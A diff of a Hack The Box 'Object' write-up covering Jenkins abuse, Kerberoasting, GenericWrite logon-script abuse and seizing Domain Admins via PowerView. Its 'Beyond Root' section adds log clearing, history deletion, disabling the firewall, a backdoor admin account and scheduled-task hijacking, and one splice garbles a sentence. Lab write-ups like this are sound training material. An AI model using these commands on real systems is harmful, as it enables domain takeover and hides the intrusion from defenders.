@@ -36,7 +36,7 @@ Create a account
 
 [Jenkins](https://www.jenkins.io/)  – an open source automation server which enables developers around the world to reliably build, test, and deploy their software.  [Jenkins](https://en.wikipedia.org/wiki/Jenkins_(software)) is an open source automation server. It helps automate the parts of software development related to building, testing, and deploying, facilitating continuous integration and continuous delivery. It is a server-based system that runs in servlet containers such as Apache Tomcat.
 
-`Daashboard -> Create a job `
+`Dashboard -> Create a job `
 
 Automated Build pipelines,  CICD
 `/Script` endpoint is script console - execute a reverse shell
@@ -295,9 +295,10 @@ echo -n "$base64" | tr -d '\n' | base64 -d > $file
 # Vim
 :set paste [ENTER ->  i -> [ctrl + shift + v]] 
 :%s/\n//g
+
 ```
 
-Witht the decryptor
+With the decryptor
 ```bash
 curl -L \
   "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_$(uname -s)_$(uname -m)" \
@@ -370,7 +371,10 @@ We are now smith
 In bloodhound Smith has generic Write over Maria
 ![](genricwriteovermaria.png)
 
-GenericWrite
+[PowerView Tips by Harmj0y](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+[Harmj0y Cheatsheets](https://github.com/HarmJ0y/CheatSheets)
+
+GenericWrite - the [iredteam Generic requires log off and on](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
 
 Upload PowerView.ps1 
 
@@ -382,13 +386,14 @@ $Cred = New-Object System.Management.Automation.PSCredential('OBJECT\smith', $Se
 Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as SMITH@OBJECT.LOCAL:
 
 ```powershell
-Set-DomainObject -Credential $Cred -Identity maria -SET @{serviceprincipalname='ActualSPN/BLAHBLAH'}
+# The service principle name does not matter 
+Set-DomainObject -Credential $Cred -Identity smith -SET @{serviceprincipalname='OBJECT/maria'}
 ```
 
-After running this, you can use Get-DomainSPNTicket as follows:
+After running this, you can use [Get-DomainSPNTicket](https://powersploit.readthedocs.io/en/latest/Recon/Get-DomainSPNTicket/#get-domainspnticket) as follows:
 
 ```powershell
-Get-DomainSPNTicket -Credential $Cred maria | fl
+Get-DomainSPNTicket -Credential $Cred -SPN 'Object/maria'  | fl
 ```
 
 The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:
@@ -398,9 +403,64 @@ Set-DomainObject -Credential $Cred -Identity maria -Clear serviceprincipalname
 ```
 
 Al decides to upload Rubeus so I will do both - [pause](https://www.youtube.com/watch?v=aYTmNU7vsmc&t=10944s).
+![](builtinfocusonusers.png)
 
+Researched and kerberoasted. 0xdf and Al were not able to do this!
+![1080](krbrthemariaspn.png)
 
-Rubeus
+Rubeus method
+
+```bash
+curl -L https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/Rubeus.exe -o Rubeus.exe
+```
+
+Use Rubeus
+```powershell
+.\Rubeus.exe kerberoast /creduser:OBJECT.LOCAL\smith /credpassword:Password123! /nowrap
+```
+
+![](nowarpaswell.png)
+
+The hash is uncrackable... Al's mood was getting to me so I checked the [0xdf writeup](https://0xdf.gitlab.io/2022/02/28/htb-object.html#shell-as-oliver). This section seems odd.
+
+![](likeahammerintheheadofassumptions.png)
+
+Al makes this out as being stupid, but it is actually quiet cool. We need to make a logon script, but without forcing a logoff as there seems to be a logon script running continiuously. Neither Al or 0xdf explain why or how. I will look into this in Beyond Root as want to understand how I would have found this. Rather than make some leap that I have GenericWrite, I have Hash that is uncrackable... No PineapplePen - I hate that song and I hate the CTFy well if only you had made this massive guess, becuase the negative space + here is something cool to upset expectations of the constraint of a CTF are... - no reboots logoff/logon. This section is both cool and obtuse bleeding into the next dimension of facepalm. Also bet Al winges about LibreOffice again lmao.
+
+Abuse GenericWrite to 
+```powershell
+cd C:\programdata
+echo "ls \users\maria\ > \programdata\out" > cmd.ps1
+Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}
+type out
+```
+
+![](lolnice.png)
+
+The name of the box now starts to make alot of sense
+```powershell
+echo "ls \users\maria\documents > \programdata\out; ls \users\maria\desktop\ > \programdata\out2" > cmd.ps1
+type out2
+```
+
+![](objectnamerings.png)
+
+```powershell
+echo "copy \users\maria\desktop\Engines.xls \programdata\" > cmd.ps1
+```
+
+![](genericwriteispower.png)
+
+Maria's fine collection
+![](mariasfinecollection.png)
+
+Thankfully Al has LibreOffice.
+
+## PrivEsc Maria to Domain Admin
+
+With the  `W3llcr4ft3d_4cls`
+
+![1080](wearemaria.png)
 
 
 Maria Has WriteOwnerShip over the Domain Admin
@@ -410,103 +470,164 @@ To change the ownership of the object, you may use the Set-DomainObjectOwner fun
 
 You may need to authenticate to the Domain Controller as MARIA@OBJECT.LOCAL if you are not running a process as that user. To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):
 
-```
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+```powershell
+$SecPassword = ConvertTo-SecureString 'W3llcr4ft3d_4cls' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('OBJECT.LOCAL\maria', $SecPassword)
 ```
 
 Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as MARIA@OBJECT.LOCAL:
-
+```powershell
+Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity maria
 ```
-Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y
-```
-
-To abuse ownership of a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowerView.
-
-You may need to authenticate to the Domain Controller as MARIA@OBJECT.LOCAL if you are not running a process as that user. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
-
-```
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+This will not work and neither will:
+```powershell
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity 'maria'
 ```
 
-Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as MARIA@OBJECT.LOCAL:
-
-```
-Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers
-```
-
-You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember.
-
-There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).
-
-To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as MARIA@OBJECT.LOCAL if you are not running a process as that user. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):
-
-```
-$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+I `diff`-ed both Empire and [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) versions of Powerview and tried the PowerSploit version instead. This then worked instantly as the DomainSearching for the Empire Version is broken.
+```powershell
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity 'maria'
 ```
 
-Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as MARIA@OBJECT.LOCAL:
+To abuse ownership of a user object, you may grant yourself the AddMember privilege. This can be accomplished using the Add-DomainObjectAcl function in PowHiding binaries
+```powershll
+attrib +h mimikatz.exe
+```erView.
 
-```
-Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
-```
-
-Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:
-
-```
-Get-DomainGroupMember -Identity 'Domain Admins'
-```
-
-Cleanup for this can be done using Remove-DomainObjectAcl
-
-```
-Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers
+```powershell
+# Set owner 
+Set-DomainObjectOwner -Identity "Domain Admins" -OwnerIdentity 'maria'
+# Add of ACL for new owner
+Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
+# Add user as member of the group
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
+# Reset ownership 
 ```
 
-Cleanup for the owner can be done by using Set-DomainObjectOwner once again)
-
-
+Remember to compare your tooling and Bloodhound quoted tool syntax can be wrong
 
 ## Beyond Root
 
+[Persistence from PLATT](https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Methodology%20and%20Resources/Windows%20-%20Persistence/#simple-user)
 
+Hiding binaries
+```powershll
+attrib +h mimikatz.exe
+```
 
+Some Cleanup stuff
 ```powershell
 Remove-Item -Recurse -Force $Directory
 del <path>\*.* /a /s /q /f
+
+# RTFM
+# Clear System and Security Logs
+cmd.exe /c wevtutil.exe cl System
+cmd.exe /c wevtutil.exe cl Security
+
+# I am Jackoby
+# empty temp folder
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# delete run box history
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Empty recycle bin
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 ```
 
+#### Modify a Firewall Rule
+
+I just turned off the firewall as elevated Maria.
+```powershell
+# Check Profile
+netsh advfirewall show currentprofile
+
+# Turn off the Firewall
+NetSh Advfirewall set allprofiles state off
+
+# Modify a Firewall Rule for a program
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=in enable=yes action=allow profile=Private
+netsh advfirewall firewall add rule name="<Rule Name>" program="<FilePath>" protocol=tcp dir=out enable=yes action=allow profile=Private
+# Delete a rule
+netsh.exe advfirewall firewall delete rule "<Rule Name>"_
+```
+[test](https://www.itninja.com/blog/view/how-to-add-firewall-rules-using-netsh-exe-advanced-way)
 
 ####  KOTH/BGs, Meta
 
 I think the ultimate meta would be to KOTH logging and exfiltrating the logs monitoring the other attackers and defender action for the TTPs.
+https://github.com/UberGuidoZ
+```powershell
+$timestamp = get-date 
+$domain = $env:USERDNSDOMAIN
+echo " $domain | $timestamp " 
+get-scheduledtask | findstr /v Disabled
+```
 
 RedTeamFieldManual is a must buy!
 ```powershell
-dsadd user "CN=John,CN=Users,DC=object,DC=local" -samid John -pwd johnspassword - display "John" -pwdneverexpires yes -memberof "DC=Domain Admins,CN=Users,DC=object,DC=local"
-
+# Check the password requirements before!
+dsadd user "CN=John,CN=Users,DC=object,DC=local" -samid John -pwd johnspassword123! -display "John" -pwdneverexpires yes -memberof "DC=Domain Admins,CN=Users,DC=object,DC=local"
 ```
 
-BlueTeamFieldManual is a must buy!
+BlueTeamFieldManual is a must buy! - and 0xdf, @MalwareJake 
+
+Use `netsh` like `wireshark` to monitor traffic to the box you are defending - @MalwareJake 
+```powershell
+netsh trace start capture=yes
+netsh trace stop
+```
+
+This was to find the logonscript used the "simulate" the maria user logging on
+```powershell
+# Hunt for Schedule Task persistence
+get-scheduledtask | findstr /v Disabled
+# Query the suspicious task
+$task = get-scheduledtask -taskname <name>
+$task | fl
+# Query execution path
+$task.Actions.Execute | fl
+# Query who it will run as
+$task.Principal | fl
+# Remove or Assimulate
+```
+
+Assimilate a schduledtask
+```powershell
+# Find task and its excution path to hijack
+get-scheduledtask | findstr /v Disabled
+$task = get-scheduledtask -taskname <name>
+$task | fl
+$task.Actions.Execute | fl
+$content = Get-Content -Path 'C:\file'
+$newContent = $content -replace '<adversary-ip>', '<your-ip>'
+$newContent | Set-Content -Path 'C:\file'
+```
 
 #### Powershell-For-Hackers
 
-Checking out I-Am-Jackoby - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers mentioned during the stream.
+Checking out I-Am-Jackoby - https://github.com/I-Am-Jakoby/PowerShell-for-Hackers mentioned during the stream. Has some functionality. Also a contributor was [UberGuidoZ](https://github.com/UberGuidoZ) who makes FlipperZero and OMG-Payloads
 
-#### Modify a Firewall Rule
-
-```powershell
-netsh 
-```
 
 #### Ping Shell
 
 [Bdamele](https://github.com/bdamele/icmpsh) ICMP shell
 
+[HTB like pwnbox](https://github.com/theGuildHall/pwnbox)
 
-https://github.com/gquere/pwn_jenkins
-https://itluke.online/2018/11/27/how-to-display-firewall-rule-ports-with-powershell/
-https://0xdf.gitlab.io/2022/02/28/htb-object.html#shell-as-oliver
-https://github.com/theGuildHall/pwnbox 
+#### Additional Finds
+
+[Pwning Jenkins](https://github.com/gquere/pwn_jenkins)
+
+From [ARZ101 writeup](https://arz101.medium.com/hackthebox-object-b7c4abbb060a)
+```powershell
+$env:USERDNSDOMAIN
+```
+
+```powershell
+get-scheduledtask | findstr /v Disabled
+```
